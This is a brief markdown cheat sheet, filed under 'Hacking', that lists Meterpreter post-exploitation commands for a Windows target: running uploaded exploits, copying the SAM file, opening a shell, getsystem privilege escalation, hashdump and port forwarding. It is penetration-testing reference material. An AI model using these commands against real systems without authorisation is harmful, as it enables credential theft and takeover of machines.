---
title: Meterpreter
category: Hacking
---

|Command                                 |Description                                                           |
|----------------------------------------|----------------------------------------------------------------------|
|upload file c:\\windows                 |Meterpreter upload file to Windows target                             |
|download c:\\windows\\repair\\sam /tmp  |Meterpreter download file from Windows target                         |
|download c:\\windows\\repair\\sam /tmp  |Meterpreter download file from Windows target                         |
|execute -f c:\\windows\temp\exploit.exe |Meterpreter run .exe on target – handy for executing uploaded exploits|
|execute -f cmd -c                       |Creates new channel with cmd shell                                    |
|ps                                      |Meterpreter show processes                                            |
|shell                                   |Meterpreter get shell on the target                                   |
|getsystem                               |Meterpreter attempts priviledge escalation the target                 |
|hashdump                                |Meterpreter attempts to dump the hashes on the target                 |
|portfwd add –l 3389 –p 3389 –r target   |Meterpreter create port forward to target machine                     |
|portfwd delete –l 3389 –p 3389 –r target|Meterpreter delete port forward                                       |
